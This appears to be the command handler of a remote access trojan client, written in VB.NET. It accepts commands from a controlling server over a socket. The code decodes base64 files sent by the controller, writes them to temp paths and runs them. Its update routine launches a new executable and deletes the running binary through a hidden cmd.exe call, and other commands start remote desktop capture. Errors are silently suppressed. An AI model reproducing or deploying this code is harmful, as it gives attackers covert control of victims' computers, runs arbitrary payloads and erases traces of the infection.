Imports System.IO

Public Class Messages
    Private Shared SPL = ClientSocket.SPL

    Public Shared Sub Read(ByVal b As Byte())
        Try
            Dim A As String() = Split(BS(b), SPL)
            Select Case A(0)

                Case "CLOSE"
                    Environment.Exit(0)

                Case "DW"
                    Download(A(1), A(2))

                Case "UPDATE"
                    Update(A(1))

                Case "RD-"
                    ClientSocket.Send("RD-")

                Case "RD+"
                    RemoteDesktop.Capture(A(1), A(2))

            End Select
        Catch ex As Exception
        End Try
    End Sub

    Private Shared Sub Download(ByVal Name As String, ByVal Data As String)
        Try
            Dim NewFile = Path.GetTempFileName + Name
            File.WriteAllBytes(NewFile, Convert.FromBase64String(Data))
            Threading.Thread.Sleep(500)
            Diagnostics.Process.Start(NewFile)
        Catch ex As Exception
        End Try
    End Sub

    Private Shared Sub Update(ByVal Data As String)
        Try
            Dim Temp As String = Path.GetTempFileName + ".exe"
            File.WriteAllBytes(Temp, Convert.FromBase64String(Data))
            Threading.Thread.Sleep(500)
            Diagnostics.Process.Start(Temp)

            Dim Del As New Diagnostics.ProcessStartInfo With {
                .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Diagnostics.Process.GetCurrentProcess.MainModule.FileName,
                .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden,
                .CreateNoWindow = True,
                .FileName = "cmd.exe"
            }

            Try
                ClientSocket.S.Shutdown(Net.Sockets.SocketShutdown.Both)
                ClientSocket.S.Close()
            Catch ex As Exception
            End Try

            Threading.Thread.Sleep(1)
            Diagnostics.Process.Start(Del)
            Environment.Exit(0)
        Catch ex As Exception
        End Try
    End Sub


End Class
